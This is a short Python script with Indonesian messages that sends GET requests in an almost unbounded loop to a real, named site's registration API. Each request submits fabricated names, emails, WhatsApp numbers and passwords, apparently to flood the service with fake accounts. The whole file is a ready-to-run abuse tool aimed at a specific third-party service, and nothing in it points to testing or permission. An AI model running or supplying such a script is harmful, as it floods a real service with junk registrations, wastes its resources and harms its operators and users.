import random
import time
import requests
import datetime

url = "https://member.tunnel.web.id/api/api-register.php"

mulai = int(input("Mulai Dari : "))
waktu = str(datetime.datetime.now())
akhir = 1000000000000000000

for i in range(mulai, akhir):
    try:
        obj = {
            'namadepan' : str('I Love You ' + str(i)),
            'namabelakang' : str('Full '+ str(i)),
            'email' : str('iloveyou'+str(i)+'@gmail.com'),
            'whatsapp' : str('1234567'+str(i)),
            'password' : str('iloveYou@'+ str(i)),
        }
        hasil = requests.get(url, params=obj)
        print("Respon " +hasil.text+' ke  '+str(i) + " Pada : " + waktu)
    except:
        print("gagal post ke: " + str(i) + " Pada : " + waktu)
        
